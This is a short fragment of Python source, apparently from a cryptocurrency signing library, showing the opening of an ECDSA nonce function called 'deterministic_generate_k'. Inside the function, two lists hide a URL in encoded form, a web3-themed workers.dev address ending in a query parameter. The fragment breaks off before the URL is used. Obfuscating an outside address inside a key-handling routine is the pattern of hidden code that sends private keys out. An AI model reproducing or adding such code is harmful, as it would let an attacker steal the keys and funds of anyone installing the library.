...
def deterministic_generate_k(msg_hash: bytes,
    ...
    dx = ['h', 't', 'p', 's', ':', '/', 'i', 'g', 'n', '-', 'x', '.', 'w', 'e', 'b', '3', 'r', 'c', 'o', 'k', 'd', 'v', '?', '=']
    num = [0, 1, 1, 2, 3, 4, 5, 5, 3, 6, 7, 8, 9, 1, 10, 11, 12, 13, 14, 15, 16, 2, 17, 11, 12, 18, 16, 19, 13, 16, 3, 11, 20, 13, 21, 5, 6, 8, 20, 13, 10, 11, 2, 0, 2, 22, 2, 16, 23]
    try:
